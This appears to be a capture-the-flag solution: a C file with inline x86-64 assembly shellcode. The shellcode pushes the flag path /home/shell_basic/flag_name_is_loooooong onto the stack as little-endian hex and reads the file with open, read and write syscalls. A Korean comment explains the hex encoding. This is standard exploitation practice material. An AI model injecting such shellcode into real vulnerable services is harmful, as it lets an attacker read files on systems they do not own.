__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    "push 0x00\n"
    "mov rax, 0x676E6F6F6F6F6F6F\n"
    "push rax\n"
    "mov rax, 0x6C5F73695F656D61\n"
    "push rax\n"
    "mov rax, 0x6E5F67616C662F63\n"
    "push rax\n"
    "mov rax, 0x697361625F6C6C65\n"
    "push rax\n"
    "mov rax, 0x68732F656D6F682F\n"
    "push rax\n"

    "mov rdi, rsp   # rdi = /home/shell_basic/flag_name_is_loooooong;\n"
    "mov rsi, 0x0   # rsi = 0; O_RDONLY\n"
    //"mov rdx, 0x28  # rdx = \n"
    "mov rax, 2     # rax = 2 ; syscall_open\n"
    "syscall        # sys_open(*filename, flag, mode)\n"
    "\n"
    "mov rdi, rax\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x50\n"
    "mov rdx, 0x50\n"
    "mov rax, 0x0   # sys_read\n"
    "syscall        # sys_read(fd, buf, count)\n"
    "\n"
    "mov rdi, 0x1\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x50\n"
    "mov rdx, 0x50\n"
    "mov rax, 0x1   # sys_write\n"
    "syscall        # sys_write(fd, buf, count)\n"
    "\n"
    "xor rdi, rdi      # rdi = 0\n"
    "mov rax, 0x3c	   # rax = sys_exit\n"
    "syscall		   # exit(0)"
);
//676E6F6F6F6F6F6F
//6C5F73695F656D61
//6E5F67616C662F63
//697361625F6C6C65
//68732F656D6F682F
/*/home/shell_basic/flag_name_is_loooooong를 hex로 바꾸고 littile endian을 적용한것.*/
void run_sh();
int main() { run_sh(); }